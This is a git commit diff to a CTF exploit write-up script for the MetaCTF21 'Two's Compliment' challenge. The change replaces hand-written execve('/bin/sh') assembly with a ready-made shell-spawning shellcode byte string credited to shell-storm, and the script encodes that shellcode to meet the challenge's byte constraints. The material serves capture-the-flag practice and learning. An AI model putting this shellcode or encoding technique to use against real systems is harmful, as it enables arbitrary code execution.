689cbca0baeafbda38b103148d36c131265583ba
knittingirl <10614967+knittingirl@users.noreply.github.com>
2021-12-10 18:11:41 -0500

    Update two_compliment_writeup.py

--- pwn_challs/MetaCTF21/Two's_Compliment/two_compliment_writeup.py
+++ pwn_challs/MetaCTF21/Two's_Compliment/two_compliment_writeup.py
@@ -10,7 +10,7 @@ print(target.recvuntil(b'What is your shellcode?'))
 
 context.clear(arch='amd64')
 
-def encode(goal_shellcode, starting_position, binsh_position):
+def encode(goal_shellcode, starting_position):
 	evened_shellcode = b''
 	encoder_shellcode = b''
 	current_position = starting_position
@@ -34,18 +34,11 @@ def encode(goal_shellcode, starting_position, binsh_position):
 
 
 starting_position = 0x80
-binsh_position = 0xf6
-goal_shellcode = asm('add rdi, '+ str(binsh_position) + ''';
-xor esi, esi;
-xor rdx, rdx;
-xor rax, rax;
-mov al, 59;
-syscall;
-''') 
-goal_shellcode += asm('NOP') * (binsh_position - starting_position  - len(goal_shellcode)) + b'/bin/sh\x00'
 
-shellcode = encode(goal_shellcode, starting_position, binsh_position)
+#Credit to http://shell-storm.org/shellcode/files/shellcode-806.php for the pre-prepared binsh shellcode.
+goal_shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 
+shellcode = encode(goal_shellcode, starting_position)
 
 print(shellcode)
 print(disasm(shellcode))
